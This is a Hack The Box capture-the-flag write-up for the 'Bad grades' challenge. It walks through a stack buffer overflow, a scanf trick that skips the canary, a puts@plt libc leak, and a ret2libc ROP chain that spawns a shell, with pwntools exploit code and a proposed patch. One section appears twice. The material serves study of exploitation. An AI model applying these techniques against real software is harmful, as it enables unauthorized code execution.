
# HTB Challenge: Bad grades

*"You are not interested in studying for school anymore, you only play CTFs and ?challenges! Your grades fell off a cliff! I will take your laptop away if you continue like this". You need to do something to raise them before your parents ground you forever.."*


![PWNED](https://raw.githubusercontent.com/Lixhr/HackTheBox/refs/heads/main/PWN/easy/bad_grades/attachments/has_been_pwned.png)

"Bad grades" is an easy-level binary exploitation box. Given an ELF and his linked libc.so, i had to find a way to control the program's execution flow. 

I consider it as an introduction to ret2libc and ROP chains.


## Information Gathering

First of all, i had to find necessary informations about the executable and its lib.

The ELF is a x64, with NX and Canay enabled. Consider that the PIE is disabled. 

With the PIE disabled, the function's addresses doesn't change from an execution to another. 
We will have to deal with Canary, take it in note for later. 

  ![ELF_CHECKSEC](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/elf_checksec.png?raw=true)


Consider that PIE is enabled on the libc. So we need to leak its base address in order to execute system()

  ![LIBC](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/libc_checksec.png?raw=true)
  
The program is quite simple. The student can view his grades, or create a new average.

When creating an average, the user inputs a *number of grades*, then fills the notes one by one.

  ![PROGRAM_OVERVIEW](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/program_screen.png?raw=true)


## Reversing the binary

Let's ask Ghidra to decompile the binary and see what's under the hood.

There are three main functions.
- menu(), that redirects the user in the two functions below. 
- view_grades(), that displays arbitrary grades. Nothing intresting found here.
- new_grades() , asking the user for his grades.
The main problem is in new_grades(). Let's clean it up and analyze it.

    void    new_grades(void)
    {
        long in_FS_OFFSET;
        int nbr_of_grades;
        double total;
        double dbl_array [33];
        long local_10;
        
        local_10 = *(long *)(in_FS_OFFSET + 0x28);
        total = 0.0;
        color_choice("Number of grades: ",&DAT_004012d8,&DAT_00401304);
        scanf("%d",&nbr_of_grades);
        for (int i = 0; i < nbr_of_grades; i++) 
        {
            printf("Grade [%d]: ",i + 1);
            scanf("%lf", dbl_array[i]);
            total += dbl_array[i];
        }
        printf("Your new average is: %.2f\n",total / (double)nbr_of_grades);
        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) 
            __stack_chk_fail();
        return;
    }
All the grades are stored in dbl_array[33], but no validations are made on the user input.

It obviously leads to a stack buffer overflow. Let's try to override the buffer with 34 entries



  ![CANARY](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/canary.png?raw=true)

Here is our stack canary, just after our array. And now?
## Bypassing canary

I first tried to bruteforce the canary's value, but it took long time. It was frustrating to wait before every try of my exploit.

I finally found a way to make scanf a "ghost" read, by justt passing a ".".

There is no integer, nor decimal. Nothing is written and our canary is still here.

- https://ir0nstone.gitbook.io/notes/misc/scanf-bypasses
## Finding the rip offset

We can write arbitrary data on the stack. We now want to override rip value with our beautiful "AAAAAAAA"

But, we first need to convert our address to its float representation:

    def pointer_to_double(pointer_value):
        byte_string = p64(pointer_value)
        hex_str = binascii.hexlify(byte_string)
        byte_data = binascii.unhexlify(hex_str)
        x = struct.unpack('d', byte_data)
        return (str(x[0]).encode())

I fuzz the program and saw that the program crashes at EIP=0x41414141414141, with a offset of 34.

Let's do a ret2main to to confirm that we can control the program's flow.

![ret2main](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/ret2main.png?raw=true)


Done.

Note that we have an "unlimited" input. We could craft a crazy ROPchain, but keep it simple. Let's call system("/bin/sh")



## Leaking the libc address


![ret2plt](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/functions.png?raw=true)

Sadly, we don't have system() linked in our executable. Whe have to ret2plt, in order to leak the libc address.

By calling puts@plt and passing the GOT entry of puts as a parameter. This causes puts to print out its own address in libc.

Base address changes at every execution. But the padding between each functions is always the same. If we can leak the puts@got address, we can guess the system@got.

    def leak_addr(func):
        leak_ropchain = [
            rop.ret[0],
            rop.rdi[0],
            elf.got['puts'],  # puts@got
            elf.plt['puts'],
            0x00401108 # return to main
        ]
        prepare_rop(len(leak_ropchain) + array_offset + canary_offset)
        send_ropchain(leak_ropchain)
        p.recvuntil(b"Your new average is:")
        p.recvline()
        leak = p.recvline() 
        leak = format_addr(leak)
        libc.address = leak - libc.sym['puts']
        success(f"Libc base address : {hex(libc.address)}")

Let's call puts@plt, and leak the puts@got. We need a little cleaning on the address to convert it in its decimal representation. Don't forget to return to main.

![address](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/address.png?raw=true)

The hard work is done. The program asks us to re-overflow it.
## Finding the rip offset

We can write arbitrary data on the stack. We now want to override rip value with our beautiful "AAAAAAAA"

But, we first need to convert our address to its float representation:

    def pointer_to_double(pointer_value):
        byte_string = p64(pointer_value)
        hex_str = binascii.hexlify(byte_string)
        byte_data = binascii.unhexlify(hex_str)
        x = struct.unpack('d', byte_data)
        return (str(x[0]).encode())

I fuzz the program and saw that the program crashes at EIP=0x41414141414141, with a offset of 34.

Let's do a ret2main to to confirm that we can control the program's flow.

![ret2main](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/ret2main.png?raw=true)


Done.

Note that we have an "unlimited" input. We could craft a crazy ROPchain, but keep it simple. Let's call system("/bin/sh")



## system()

Let's keep the same pattern:

    def exploit():
        exploit_ropchain = [
            rop.ret[0],
            rop.rdi[0],
            next(libc.search(b'/bin/sh')),
            libc.sym['system'],
        ]
        prepare_rop(array_offset + canary_offset + len(exploit_ropchain) + 1)
        p.sendline(b"0.0") 
        info("Sending payload...")
        info(f"System : {hex(exploit_ropchain[2])}")
        info(f"/bin/sh: {hex(exploit_ropchain[1])}")
        send_ropchain(exploit_ropchain)
        p.interactive()

Find a "/bin/sh" address on the libc. It is a common gadget.

After pushing it into RDI (1st arg), just execute system(). A shell returns, and asks you to cat flag.

![system](https://github.com/Lixhr/HackTheBox/blob/main/PWN/easy/bad_grades/attachments/final.png?raw=true)



## Patch

In order to path this vulnerability, the developper can check that the number of grades fits the buffer size of 33, and return an error on overflow.

    void    new_grades(void)
    {
        long in_FS_OFFSET;
        int nbr_of_grades;
        double total;
        double dbl_array [33];
        long local_10;
        
        local_10 = *(long *)(in_FS_OFFSET + 0x28);
        total = 0.0;
        color_choice("Number of grades: ",&DAT_004012d8,&DAT_00401304);
        scanf("%d",&nbr_of_grades);


        // Check the user input
        if (nbr_of_grades > 33)
        {
            fprintf(2, "Please set a smaller number of grades");
            exit(1);
        }


        for (int i = 0; i < nbr_of_grades; i++) 
        {
            printf("Grade [%d]: ",i + 1);
            scanf("%lf", dbl_array[i]);
            total += dbl_array[i];
        }
        printf("Your new average is: %.2f\n",total / (double)nbr_of_grades);
        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) 
            __stack_chk_fail();
        return;
    }
## References

- https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc
- https://beta.hackndo.com/
- https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame